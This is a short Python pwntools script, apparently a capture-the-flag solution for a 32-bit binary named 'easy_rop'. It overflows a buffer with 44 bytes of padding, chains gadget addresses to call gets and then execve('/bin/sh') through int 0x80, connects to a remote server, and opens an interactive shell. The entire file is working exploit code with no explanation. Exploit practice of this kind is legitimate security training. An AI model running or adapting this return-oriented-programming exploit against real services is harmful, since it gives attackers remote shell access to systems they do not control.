#!/usr/bin/env python

from pwn import *

int_0x80 = 0x0806CD25
pop_eax_ret = 0x80B8B46 #eax == 0x0b
pop_esi_ebx_edx_ret = 0x806F119 # ebx == '/bin/sh' ecx == '' edx == '' esi ==''
pop_ecx_ret = 0x080DF3D1
gets_addr = 0x804F200
writeable_addr = 0x80ECB00
empty_addr = 0x80ECC00


#r = process("./easy_rop")
r = remote("www.luojiaqs.top", 1002)
#gdb.attach(r, "b *0x80488CD")

payload = "a" * 44
payload += flat([gets_addr, pop_eax_ret, writeable_addr, pop_eax_ret, 0x0b, pop_esi_ebx_edx_ret, empty_addr, writeable_addr, empty_addr, pop_ecx_ret, empty_addr, int_0x80])

raw_input("payload")
r.sendline(payload)

payload = "/bin/sh"
raw_input("payload2")
r.sendline(payload)

r.interactive()
r.close()
